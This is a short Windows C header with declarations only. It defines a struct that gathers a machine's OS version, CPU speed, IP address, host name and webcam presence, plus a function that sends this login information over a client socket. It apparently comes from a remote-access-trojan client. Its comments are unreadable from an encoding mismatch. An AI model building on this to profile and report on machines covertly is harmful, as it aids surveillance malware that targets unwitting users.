#pragma once

#include <WinSock2.h>
#include "ClientSocket.h"
#include "Common.h"

#pragma comment(lib,"ws2_32.lib")
typedef struct
{	
	BYTE			bToken;			// = 1    //��½��Ϣ
	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	int				CPUClockMhz;	// CPU��Ƶ
	IN_ADDR			IPAddress;		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			HostName[50];	// ������
	bool			bIsWebCam;		// �Ƿ�������ͷ
	DWORD			dwSpeed;		// ����
}LOGININFO;


//��½����
int SendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed);

//�������������
UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize);

DWORD CPUClockMhz();
bool IsWebCam();